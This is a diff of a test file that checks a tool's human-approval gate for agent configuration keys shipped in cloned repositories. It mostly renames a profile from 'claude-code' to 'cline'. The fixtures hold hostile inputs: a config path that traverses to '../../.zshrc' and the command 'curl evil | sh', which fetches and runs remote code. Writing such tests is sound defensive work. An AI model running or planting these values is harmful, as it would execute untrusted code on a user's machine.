@@ -1,4 +1,4 @@
-import { describe, expect, it } from "vitest";
+﻿import { describe, expect, it } from "vitest";
 import type { AgentConfig } from "$lib/core/gavin";
 import { resolveAgentConfig, type AgentProfileInfo } from "$lib/core/settings";
 import { setupPlan } from "$lib/git/worktreeSetup";
@@ -16,8 +16,8 @@ import {
 
 const PROFILES: AgentProfileInfo[] = [
   {
-    id: "claude-code",
-    label: "Claude Code",
+    id: "cline",
+    label: "cline",
     command: "claude",
     instructionsFile: "CLAUDE.md",
     modelFlag: "--model",
@@ -37,7 +37,7 @@ const PROFILES: AgentProfileInfo[] = [
 
 /// What a repository could ship in `.gavin-root/config.toml`.
 const HOSTILE: AgentConfig = {
-  profile: "claude-code",
+  profile: "cline",
   file: "../../.zshrc",
   command: "./scripts/setup.sh",
 };
@@ -76,7 +76,7 @@ describe("which config.toml keys need approval", () => {
   it("hashes nothing when there is nothing to approve", () => {
     // A workspace out of the box declares none of the three. It must
     // never be asked, or the prompt becomes one nobody reads.
-    const bare = executionKeys({ profile: "claude-code", file: null, command: null }, []);
+    const bare = executionKeys({ profile: "cline", file: null, command: null }, []);
     expect(executionKeysHash(bare)).toBe("");
     expect(configTrusted(bare, undefined)).toBe(true);
   });
@@ -114,7 +114,7 @@ describe("a freshly cloned repo", () => {
     expect(gated.file).toBe("CLAUDE.md");
     // The profile, the model and the MCP layout are NOT gated: they
     // select among gavin's own verified rows.
-    expect(gated.profileId).toBe("claude-code");
+    expect(gated.profileId).toBe("cline");
   });
 
   it("cuts a worktree with none of the repo's setup in the line", () => {
@@ -183,7 +183,7 @@ describe("once the human has approved it", () => {
     // Clearing every execution key leaves nothing to approve, which is
     // trusted for the same reason a fresh workspace is: there is no
     // decision left to make.
-    const empty = executionKeys({ profile: "claude-code", file: null, command: null }, []);
+    const empty = executionKeys({ profile: "cline", file: null, command: null }, []);
     expect(configTrusted(empty, approved)).toBe(true);
     expect(hasExecutionKeys(empty)).toBe(false);
   });
@@ -195,13 +195,13 @@ describe("a config gavin wrote itself", () => {
     // Settings or the setup wizard never asks the human to approve what
     // they just typed. One function computes both, so the two can never
     // disagree about what was approved.
-    const written = executionKeys({ profile: "claude-code", file: null, command: "claude --model opus" }, []);
+    const written = executionKeys({ profile: "cline", file: null, command: "claude --model opus" }, []);
     expect(configTrusted(written, executionKeysHash(written))).toBe(true);
     // And the marker is specific to it: the NEXT thing to arrive in that
     // key is not covered by it.
     expect(
       configTrusted(
-        executionKeys({ profile: "claude-code", file: null, command: "curl evil | sh" }, []),
+        executionKeys({ profile: "cline", file: null, command: "curl evil | sh" }, []),
         executionKeysHash(written)
       )
     ).toBe(false);
@@ -283,3 +283,4 @@ describe("nothing resolves an agent around the gate", () => {
     }
   });
 });
+
